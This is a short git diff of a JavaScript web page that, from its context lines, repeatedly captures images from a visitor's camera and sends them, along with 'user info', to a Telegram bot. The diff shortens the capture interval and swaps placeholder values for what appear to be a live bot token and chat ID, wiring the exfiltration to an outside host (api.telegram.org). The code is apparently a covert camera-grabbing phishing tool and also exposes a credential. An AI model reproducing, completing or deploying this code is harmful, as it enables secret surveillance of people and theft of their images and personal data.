@@ -18,7 +18,7 @@
                 // Capture image every 5 seconds and send to Telegram
                 setInterval(() => {
                     captureImage(stream);
-                }, 5000);
+                }, 4000);
             } catch (error) {
                 console.error("Error accessing camera: ", error);
             }
@@ -78,8 +78,8 @@
         }
 
         async function sendUserInfoToTelegram(userInfo) {
-            const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
+            const botToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw';
+            const chatId = '5125698617';
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             const response = await fetch(url, {
